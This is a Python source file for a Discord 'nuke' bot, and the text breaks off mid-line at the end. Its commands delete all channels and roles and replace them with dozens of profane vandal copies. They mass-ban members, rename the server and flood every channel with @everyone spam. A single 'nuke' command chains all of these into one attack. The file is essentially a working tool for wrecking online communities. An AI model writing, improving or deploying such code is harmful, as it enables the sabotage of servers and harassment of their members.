import discord
from discord.ext import commands
import asyncio
import random
import logging
import os

intents = discord.Intents.all()
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

TOKEN = os.getenv("TOKEN")

if not TOKEN:
    print("ERROR: TOKEN environment variable not set!")
    exit(1)

@bot.event
async def on_ready():
    print(f"[{bot.user}] ULTRA FAST Kieran Nuke Bot Online")
    await bot.change_presence(activity=discord.Game(name="Kieran Fast Nuke"))

async def set_kieran_icon(guild):
    try:
        with open("kieran_icon.jpg", "rb") as f:
            await guild.edit(icon=f.read(), reason="Kieran Nuke")
        logging.info("Icon set")
    except:
        pass

async def safe_delete(obj):
    try:
        await obj.delete()
    except:
        pass

async def safe_ban(member):
    try:
        await member.ban(reason="Nuke by Kieran", delete_message_days=1)
    except:
        pass

# Ultra fast spam task
async def spam_task(channel, text, count=80):
    for _ in range(count):
        try:
            await channel.send(f"@everyone {text}")
        except:
            pass  # Fail silently and keep going

@bot.command()
@commands.has_permissions(administrator=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for ch in list(guild.channels):
        await safe_delete(ch)
    for i in range(50):
        try:
            cat = await guild.create_category(f"fucked-by-kieran")
            await guild.create_text_channel("fucked-by-kieran", category=cat)
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    members = list(guild.members)
    random.shuffle(members)
    for member in members:
        if member != guild.owner and member != bot.user and not member.bot:
            await safe_ban(member)

@bot.command()
@commands.has_permissions(administrator=True)
async def roles(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for role in reversed(list(guild.roles)):
        if role != guild.default_role and role != guild.me.top_role:
            await safe_delete(role)
    for _ in range(100):
        try:
            await guild.create_role(name="fucked by Kieran", colour=discord.Colour.random())
        except:
            pass

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, *, text: str = "fucked by Kieran - Protocol Zero"):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info("Starting ULTRA PARALLEL spam in EVERY channel")
    
    channels_to_spam = guild.text_channels + [thread for thread in guild.threads]
    
    # Create spam tasks for ALL channels at once
    tasks = [spam_task(channel, text, 80) for channel in channels_to_spam]
    
    # Run all spam tasks simultaneously
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Extra aggressive round
    for _ in range(8):
        extra_tasks = [spam_task(channel, text, 30) for channel in guild.text_channels]
        await asyncio.gather(*extra_tasks, return_exceptions=True)
    
    logging.info("ULTRA FAST parallel spam complete")

@bot.command()
@commands.has_permissions(administrator=True)
async def servername(ctx, *, name: str = "NUKED BY KIERAN"):
    await ctx.message.delete()
    try:
        await ctx.guild.edit(name=name)
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.send("🚀 **KIERAN ULTRA FAST NUKE PROTOCOL ACTIVATED**")
    guild = ctx.guild
    
    await set_kieran_icon(guild)
    
    await asyncio.gather(
        roles(ctx),
        channels(ctx),
        ban(ctx),
        servername(ctx),
        return_exceptions=True
    )
    
    await spam(ctx)
    await ctx.send("@everyone **SERVER FUCKED BY KIERAN**")
    logging.info("ULTRA
